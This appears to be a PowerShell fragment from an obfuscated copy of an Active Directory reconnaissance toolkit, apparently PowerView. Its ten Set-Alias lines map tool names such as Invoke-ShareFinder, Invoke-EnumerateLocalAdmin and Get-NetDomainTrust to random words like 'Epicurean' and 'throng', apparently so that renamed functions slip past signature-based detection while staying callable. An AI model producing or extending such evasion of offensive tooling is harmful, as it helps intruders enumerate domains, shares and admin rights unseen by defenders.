Set-Alias Invoke-EventHunter Epicurean
Set-Alias Invoke-ShareFinder exiles
Set-Alias Invoke-FileFinder forwarder
Set-Alias Invoke-EnumerateLocalAdmin dry
Set-Alias Get-NetDomainTrust adjustable
Set-Alias Get-NetForestTrust rehearsed
Set-Alias Find-ForeignUser Viacom
Set-Alias Find-ForeignGroup assemblages
Set-Alias Invoke-MapDomainTrust ferns
Set-Alias Get-DomainPolicy throng
